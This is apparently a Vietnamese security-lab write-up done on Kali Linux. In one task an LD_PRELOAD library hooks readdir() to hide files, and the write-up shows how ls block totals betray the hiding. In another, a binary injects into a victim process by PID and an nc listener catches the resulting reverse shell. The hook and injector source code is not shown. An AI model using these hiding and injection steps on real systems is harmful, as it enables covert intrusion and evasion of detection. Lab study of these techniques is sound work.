# Task 1
Ban đầu sử dụng `ls` ta thấy số block là 336

> Số block được tính bằng lệnh stat() trên từng file, sau đó cộng lại. Giá trị này được tính dựa trên dung lượng thực sự mà file chiếm trên đĩa

![image](https://hackmd.io/_uploads/SkywvaVrgg.png)

Thực hiện ẩn file
```
┌──(kali㉿kali)-[~/Desktop/Task_1]
└─$ gcc -Wall -fPIC -shared -o task_1.so task_1.c -ldl

┌──(kali㉿kali)-[~/Task_1]
└─$export LD_PRELOAD="/home/kali/Desktop/task_1.so"
```
Khi ẩn file bằng cách hook `readdir()`, `ls` không thấy file đó nữa, nên không gọi `stat()`, và không cộng block của file đó vào tổng. Ta sẽ thấy total khi dùng `ls` giảm còn 332

![image](https://hackmd.io/_uploads/Hy8ob64rex.png)

Hoàn thành task 1
```
┌──(kali㉿kali)-[~/Desktop/Task_1]
└─$ unset LD_PRELOAD
```
# Task 2
Tại máy nạn nhân, tạo 1 process để thực hiện inject
```
┌──(root㉿kali)-[/home/kali/Desktop/Week_5/Task_2]
└─# sleep 20 &                                                                                          
[1] 191582
```

![image](https://hackmd.io/_uploads/Sk-rmfrrlx.png)

Nạn nhân thực hiện chạy file

```
┌──(root㉿kali)-[/home/kali/Desktop/Week_5/Task_2]
└─# ./task_2 <pid>
```

Tại máy tấn công kết nối cổng nghe
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
=
```

Khi process này kết thúc thì shell sẽ xuất hiện

![image](https://hackmd.io/_uploads/SJSuVMSSeg.png)
